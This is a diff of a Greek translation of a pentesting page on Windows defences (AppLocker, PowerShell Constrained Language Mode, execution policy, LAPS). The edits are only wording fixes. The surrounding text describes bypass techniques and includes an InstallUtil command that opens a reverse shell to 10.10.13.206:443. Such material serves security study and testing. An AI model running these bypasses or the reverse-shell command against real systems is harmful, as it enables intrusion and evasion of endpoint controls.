@@ -6,7 +6,7 @@
 
 Μια λίστα λευκών εφαρμογών είναι μια λίστα εγκεκριμένων λογισμικών εφαρμογών ή εκτελέσιμων που επιτρέπεται να είναι παρόντα και να εκτελούνται σε ένα σύστημα. Ο στόχος είναι να προστατευθεί το περιβάλλον από κακόβουλο λογισμικό και μη εγκεκριμένο λογισμικό που δεν ευθυγραμμίζεται με τις συγκεκριμένες επιχειρηματικές ανάγκες ενός οργανισμού.
 
-[AppLocker](https://docs.microsoft.com/en-us/windows/security/threat-protection/windows-defender-application-control/applocker/what-is-applocker) είναι η **λύση λευκής λίστας εφαρμογών** της Microsoft και δίνει στους διαχειριστές συστημάτων έλεγχο πάνω σε **ποια εφαρμογές και αρχεία μπορούν να εκτελούν οι χρήστες**. Παρέχει **λεπτομερή έλεγχο** πάνω σε εκτελέσιμα, σενάρια, αρχεία εγκατάστασης Windows, DLLs, πακέτα εφαρμογών και εγκαταστάτες πακέτων εφαρμογών.\
+[AppLocker](https://docs.microsoft.com/en-us/windows/security/threat-protection/windows-defender-application-control/applocker/what-is-applocker) είναι η **λύση λευκής λίστας εφαρμογών** της Microsoft και δίνει στους διαχειριστές συστημάτων έλεγχο πάνω σε **ποια εφαρμογές και αρχεία μπορούν να εκτελούν οι χρήστες**. Παρέχει **λεπτομερή έλεγχο** πάνω σε εκτελέσιμα, σενάρια, αρχεία εγκατάστασης Windows, DLLs, συσκευασμένες εφαρμογές και εγκαταστάτες συσκευασμένων εφαρμογών.\
 Είναι κοινό για τους οργανισμούς να **μπλοκάρουν το cmd.exe και το PowerShell.exe** και την εγγραφή σε ορισμένους καταλόγους, **αλλά όλα αυτά μπορούν να παρακαμφθούν**.
 
 ### Check
@@ -33,7 +33,7 @@ C:\Windows\System32\spool\drivers\color
 C:\Windows\Tasks
 C:\windows\tracing
 ```
-- Συνήθως **έμπιστοι** [**"LOLBAS's"**](https://lolbas-project.github.io/) δυαδικοί κωδικοί μπορεί να είναι επίσης χρήσιμοι για να παρακαμφθεί το AppLocker.
+- Συνήθως **έμπιστοι** [**"LOLBAS's"**](https://lolbas-project.github.io/) δυαδικοί κώδικες μπορούν επίσης να είναι χρήσιμοι για να παρακαμφθεί το AppLocker.
 - **Κακώς γραμμένοι κανόνες θα μπορούσαν επίσης να παρακαμφθούν**
 - Για παράδειγμα, **`<FilePathCondition Path="%OSDRIVE%*\allowed*"/>`**, μπορείτε να δημιουργήσετε έναν **φάκελο με όνομα `allowed`** οπουδήποτε και θα επιτραπεί.
 - Οι οργανισμοί συχνά επικεντρώνονται στο **να μπλοκάρουν το `%System32%\WindowsPowerShell\v1.0\powershell.exe` εκτελέσιμο**, αλλά ξεχνούν τις **άλλες** [**τοποθεσίες εκτελέσιμων PowerShell**](https://www.powershelladmin.com/wiki/PowerShell_Executables_File_System_Locations) όπως το `%SystemRoot%\SysWOW64\WindowsPowerShell\v1.0\powershell.exe` ή το `PowerShell_ISE.exe`.
@@ -156,7 +156,7 @@ sc query windefend
 ```
 [**Βρείτε περισσότερες πληροφορίες σε αυτή την ανάρτηση**](https://cube0x0.github.io/Relaying-for-gMSA/)
 
-Επίσης, ελέγξτε αυτήν την [ιστοσελίδα](https://cube0x0.github.io/Relaying-for-gMSA/) σχετικά με το πώς να εκτελέσετε μια **επίθεση NTLM relay** για να **διαβάσετε** τον **κωδικό πρόσβασης** του **gMSA**.
+Επίσης, ελέγξτε αυτή τη [σελίδα](https://cube0x0.github.io/Relaying-for-gMSA/) σχετικά με το πώς να εκτελέσετε μια **επίθεση NTLM relay** για να **διαβάσετε** τον **κωδικό πρόσβασης** του **gMSA**.
 
 ## LAPS
 
@@ -168,7 +168,7 @@ sc query windefend
 
 ## PS Constrained Language Mode
 
-Το PowerShell [**Constrained Language Mode**](https://devblogs.microsoft.com/powershell/powershell-constrained-language-mode/) **περιορίζει πολλές από τις δυνατότητες** που απαιτούνται για τη χρήση του PowerShell αποτελεσματικά, όπως η μπλοκάρισμα COM αντικειμένων, η επιτρεπόμενη μόνο χρήση εγκεκριμένων τύπων .NET, ροές εργασίας βασισμένες σε XAML, κλάσεις PowerShell και άλλα.
+Το PowerShell [**Constrained Language Mode**](https://devblogs.microsoft.com/powershell/powershell-constrained-language-mode/) **περιορίζει πολλές από τις δυνατότητες** που απαιτούνται για τη χρήση του PowerShell αποτελεσματικά, όπως η μπλοκάρισμα COM αντικειμένων, η επιτρεπόμενη χρήση μόνο εγκεκριμένων τύπων .NET, ροές εργασίας βασισμένες σε XAML, κλάσεις PowerShell και άλλα.
 
 ### **Έλεγχος**
 ```powershell
@@ -191,11 +191,11 @@ C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogTo
 ```bash
 C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=true /revshell=true /rhost=10.10.13.206 /rport=443 /U c:\temp\psby.exe
 ```
-Μπορείτε να χρησιμοποιήσετε [**ReflectivePick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) ή [**SharpPick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) για να **εκτελέσετε κώδικα Powershell** σε οποιαδήποτε διαδικασία και να παρακάμψετε τη περιορισμένη λειτουργία. Για περισσότερες πληροφορίες δείτε: [https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-contstrained-language-mode](https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-contstrained-language-mode).
+Μπορείτε να χρησιμοποιήσετε [**ReflectivePick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) ή [**SharpPick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) για να **εκτελέσετε κώδικα Powershell** σε οποιαδήποτε διαδικασία και να παρακάμψετε τη περιορισμένη λειτουργία. Για περισσότερες πληροφορίες, ελέγξτε: [https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-contstrained-language-mode](https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-contstrained-language-mode).
 
 ## Πολιτική Εκτέλεσης PS
 
-Από προεπιλογή είναι ρυθμισμένη σε **restricted.** Κύριοι τρόποι για να παρακάμψετε αυτή την πολιτική:
+Από προεπιλογή είναι ρυθμισμένη σε **restricted.** Οι κύριοι τρόποι για να παρακάμψετε αυτήν την πολιτική:
 ```powershell
 1º Just copy and paste inside the interactive PS console
 2º Read en Exec
@@ -236,7 +236,7 @@ More can be found [here](https://blog.netspi.com/15-ways-to-bypass-the-powershel
 - **Negotiate**: Χρησιμοποιείται για να διαπραγματευτεί το πρωτόκολλο που θα χρησιμοποιηθεί (Kerberos ή NTLM, με το Kerberos να είναι το προεπιλεγμένο)
 - %windir%\Windows\System32\lsasrv.dll
 
-#### Η διαπραγμάτευση θα μπορούσε να προσφέρει αρκετές μεθόδους ή μόνο μία.
+#### Η διαπραγμάτευση μπορεί να προσφέρει πολλές μεθόδους ή μόνο μία.
 
 ## UAC - User Account Control
 
